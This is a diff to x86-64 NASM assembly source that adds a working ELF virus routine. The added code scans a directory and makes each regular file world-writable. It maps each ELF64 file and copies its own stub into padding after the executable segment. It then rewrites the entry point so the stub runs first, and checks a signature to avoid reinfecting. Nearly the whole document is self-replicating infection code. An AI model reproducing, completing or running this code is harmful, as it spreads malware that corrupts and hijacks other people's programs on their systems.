@@ -1,7 +1,7 @@
 global _start
 section .text
 
-%define data(x)       [(rsp - data_size) + data.%+x]
+%define data(x)       [(rbp - data_size) + data.%+x]
 
 STUB_SIZE:      equ (_end - _start)
 DIRENT_ARR_SIZE:    equ 1024
@@ -11,11 +11,14 @@ SYS_READ:       equ 0
 SYS_WRITE:      equ 1
 SYS_OPEN:       equ 2
 SYS_CLOSE:      equ 3
+SYS_FSTAT:      equ 5
 SYS_LSEEK:      equ 8
 SYS_MMAP:       equ 9
 SYS_MPROTECT:   equ 10
+SYS_MUNMAP:     equ 11
 SYS_EXIT:       equ 60
 SYS_GETDENTS:   equ 78
+SYS_CHMOD:      equ 90
 
 ; open flags
 O_RDONLY:       equ 0
@@ -23,14 +26,13 @@ O_WRONLY:       equ 1
 O_RDWR:         equ 2
 O_DIRECTORY:    equ 65536
 
-; mmap flags
+; m{map,protect} flags
 MAP_SHARED:     equ 0x01
 MAP_PRIVATE:    equ 0x02
-
-; mprotect flags
-PROT_READ:  equ 0x01
-PROT_WRITE: equ 0x02
-PROT_EXEC:  equ 0x04
+PROT_READ:      equ 0x01
+PROT_WRITE:     equ 0x02
+PROT_EXEC:      equ 0x04
+MAP_ERROR:      equ -4095
 
 ; lseek flags
 SEEK_SET:   equ 0
@@ -100,6 +102,17 @@ struc Elf64_Ehdr
     .e_shstrndx     resw 1
 endstruc
 
+struc	Elf64_Phdr
+.p_type			resd	1
+.p_flags		resd	1
+.p_offset		resq	1
+.p_vaddr		resq	1
+.p_paddr		resq	1
+.p_filesz		resq	1
+.p_memsz		resq	1
+.p_align		resq	1
+	endstruc
+
 struc Elf64_Shdr
     .sh_name        resd 1
     .sh_type        resd 1
@@ -132,7 +145,11 @@ struc data
     .base_address   resq 1
     .dirent_array   resb DIRENT_ARR_SIZE
     .dir_fd         resq 1
-    .file_path      resq 1
+    .file_path      resb 1024
+    .host_fd        resq 1
+    .stat           resb stat_size
+    .host_size      resq 1
+    .host_bytes     resq 1
 endstruc
 
 _start:
@@ -200,7 +217,7 @@ _start:
         add r13, rdx
         cmp al, DT_REG
         jne .next_file
-        call do_infect
+        call try_infect
     .next_file:
         cmp r13, r12
         jl .process_file
@@ -229,7 +246,7 @@ _start:
     jmp rax
 
 ; r14 = dirname, rdi = filename
-do_infect:
+try_infect:
     push rdi
     lea rdi, [rel infect_msg]
     mov rsi, 7
@@ -249,7 +266,150 @@ do_infect:
         movsb
         cmp BYTE [rsi - 1], 0
         jnz .file_name
-    ret
+    mov rdi, rdx
+    push rdi
+    mov rsi, 0o777
+    mov rax, SYS_CHMOD
+    syscall
+    pop rdi
+
+    mov rdi, O_RDWR
+    mov rax, SYS_OPEN
+    syscall
+    test rax, rax
+    jl .return
+    mov data(host_fd), rax
+
+    lea rsi, data(stat)
+    mov rdi, rax
+    mov rax, SYS_FSTAT
+    syscall
+    cmp rax, 0
+    jnz .close
+
+    mov rsi, QWORD data(stat + stat.st_size)
+    mov data(host_size), rsi
+    cmp rsi, Elf64_Ehdr_size + Elf64_Phdr_size + STUB_SIZE
+    jl .close
+
+    xor r9, r9
+    mov r8, data(host_fd)
+    mov r10, MAP_SHARED
+    mov rdx, PROT_READ | PROT_WRITE
+    xor rdi, rdi
+    mov rax, SYS_MMAP
+    syscall
+    cmp rax, MAP_ERROR
+    jae .close
+    mov data(host_bytes), rax
+    mov rdi, rax
+
+    call is_elf64
+    test rax, rax
+    jz .unmap
+    call do_infect
+
+    .unmap:
+        mov rsi, data(host_size)
+        mov rdi, data(host_bytes)
+        mov rax, SYS_MUNMAP
+        syscall
+    .close:
+        mov rdi, data(host_fd)
+        mov rax, SYS_CLOSE
+        syscall
+    .return:
+        ret
+
+is_elf64:
+    xor rax, rax
+    cmp QWORD [rdi + 8], rax
+    jnz .return
+    mov rdx, 0x00010102464c457f
+    cmp QWORD [rdi], rdx
+    jz .continue
+    mov rdx, 0x03010102464c457f
+    cmp QWORD [rdi], rdx
+    jnz .return
+    .continue:
+        mov rdx, 0x00000001003e0003
+        cmp QWORD [rdi + 16], rdx
+        jz .ok
+        mov rdx, 0x00000001003e0002
+        cmp QWORD [rdi + 16], rdx
+        jnz .return
+    .ok:
+        mov rax, 1
+    .return:
+        ret
+
+do_infect:
+    push rdi
+    lea rdi, [rel do_infect_msg]
+    mov rdi, 10
+    call write
+    pop rdi
+
+    push r13
+    push r14
+    push r15
+
+    mov r15, rdi
+    mov rdx, qword [rdi + Elf64_Ehdr.e_entry]
+    movzx rcx, WORD [rdi + Elf64_Ehdr.e_phnum]
+    mov rax, QWORD [rdi + Elf64_Ehdr.e_phoff]
+    add rdi, rax
+    mov r14, rdi
+
+    .segment:
+        cmp rcx, 0
+        jle .return
+        mov rax, 0x0000000500000001
+        cmp rax, QWORD [rdi]
+        jnz .next
+        mov rax, QWORD [rdi + Elf64_Phdr.p_vaddr]
+        cmp rdx, rax
+        jb .next
+        add rax, QWORD [rdi + Elf64_Phdr.p_memsz]
+        mov r13, rax
+        cmp rdx, rax
+        jl .find_space
+    .next:
+        add rdi, Elf64_Phdr_size
+        dec rcx
+        jmp .segment
+    .find_space:
+        mov rax, QWORD [rdi + Elf64_Phdr.p_offset]
+        add rax, QWORD [rdi + Elf64_Phdr.p_filesz]
+        lea rdi, [r15 + rax]
+        mov rsi, rdi
+        xor al, al
+        mov rcx, STUB_SIZE
+        repz scasb
+        test rcx, rcx
+        ja .return
+        lea rdi, [rel _start]
+        xchg rdi, rsi
+        mov rax, [rel signature]
+        cmp rax, QWORD [rdi - (_end - signature)]
+        jz .return
+
+        mov rcx, STUB_SIZE
+        repnz movsb
+
+        mov rax, QWORD [r15 + Elf64_Ehdr.e_entry]
+        mov QWORD [rdi - 16], r13
+        mov QWORD [rdi - 8], rax
+
+        mov QWORD [r15 + Elf64_Ehdr.e_entry], r13
+        mov rax, STUB_SIZE
+        add QWORD [r14 + Elf64_Phdr.p_filesz], rax
+        add QWORD [r14 + Elf64_Phdr.p_memsz], rax
+    .return:
+        pop r15
+        pop r14
+        pop r13
+        ret
 
 ; in: -
 ; out: base_address (rax)
@@ -371,6 +531,11 @@ file_msg:
     db "file", 10
 close_msg:
     db "close", 10
+do_infect_msg:
+    db "do_infect", 10
+try_infect_msg:
+    db "try_infect", 10
+
 _end:
 
 _host:
